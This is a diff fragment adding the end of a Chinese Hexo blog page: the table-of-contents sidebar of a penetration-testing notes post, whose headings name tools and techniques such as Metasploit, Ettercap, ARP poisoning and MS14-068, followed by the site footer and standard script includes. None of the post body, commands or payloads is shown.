+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-number">1.</span> <span class="nav-text"></span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RECON「侦察模块」"><span class="nav-number">1.1.</span> <span class="nav-text">RECON「侦察模块」</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Domain"><span class="nav-number">1.1.1.</span> <span class="nav-text">1. Domain</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-Person"><span class="nav-number">1.1.2.</span> <span class="nav-text">2. Person</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-Parse-salesforce"><span class="nav-number">1.1.3.</span> <span class="nav-text">3. Parse salesforce</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SCANNING"><span class="nav-number">1.2.</span> <span class="nav-text">SCANNING</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#4-Generate-target-list"><span class="nav-number">1.2.1.</span> <span class="nav-text">4. Generate target list</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-CIDR-List-IP-Range-or-URL"><span class="nav-number">1.2.2.</span> <span class="nav-text">5. CIDR, List, IP, Range, or URL</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WEB"><span class="nav-number">1.3.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#8-Open-multiple-tabs-in-Firefox"><span class="nav-number">1.3.1.</span> <span class="nav-text">8. Open multiple tabs in Firefox</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-Nikto"><span class="nav-number">1.3.2.</span> <span class="nav-text">9. Nikto</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-SSL"><span class="nav-number">1.3.3.</span> <span class="nav-text">10. SSL</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MISC"><span class="nav-number">1.4.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#11-Crack-WiFi"><span class="nav-number">1.4.1.</span> <span class="nav-text">11. Crack WiFi</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#12-Parse-XML"><span class="nav-number">1.4.2.</span> <span class="nav-text">12. Parse XML</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-Generate-a-malicious-payload"><span class="nav-number">1.4.3.</span> <span class="nav-text">13. Generate a malicious payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#14-Start-a-Metasploit-listener"><span class="nav-number">1.4.4.</span> <span class="nav-text">14. Start a Metasploit listener</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#15-Update"><span class="nav-number">1.4.5.</span> <span class="nav-text">15. Update</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PeepingTom"><span class="nav-number">1.5.</span> <span class="nav-text">PeepingTom</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLninja"><span class="nav-number">1.6.</span> <span class="nav-text">SQLninja</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ettercap"><span class="nav-number">1.7.</span> <span class="nav-text">Ettercap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ARP毒化"><span class="nav-number">1.8.</span> <span class="nav-text">ARP毒化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dsniff-amp-ARP欺骗攻击"><span class="nav-number">1.9.</span> <span class="nav-text">Dsniff&ARP欺骗攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hamster"><span class="nav-number">1.10.</span> <span class="nav-text">Hamster</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#国外密码字典"><span class="nav-number">1.11.</span> <span class="nav-text">国外密码字典</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#searchsploit"><span class="nav-number">1.12.</span> <span class="nav-text">searchsploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ADS"><span class="nav-number">1.13.</span> <span class="nav-text">ADS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Scanning"><span class="nav-number">1.14.</span> <span class="nav-text">2.    Scanning</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#数据库端口对照表"><span class="nav-number">1.14.1.</span> <span class="nav-text">数据库端口对照表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SCADA-ICS"><span class="nav-number">1.14.2.</span> <span class="nav-text">SCADA / ICS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#zmap"><span class="nav-number">1.14.3.</span> <span class="nav-text">zmap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Ms14-068"><span class="nav-number">1.14.4.</span> <span class="nav-text">Ms14 068</span></a></li></ol></li></ol></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EvilAnne</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+  <span id="busuanzi_container_site_pv">访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"http://evilanne.duoshuo.com"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+      
+      <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+      <script src="/js/src/hook-duoshuo.js"></script>
+    
+  
+
+
+
+
+
+  
+  
+  
+
+  
+
+  
+ 
+  
+
+</body>
+</html>
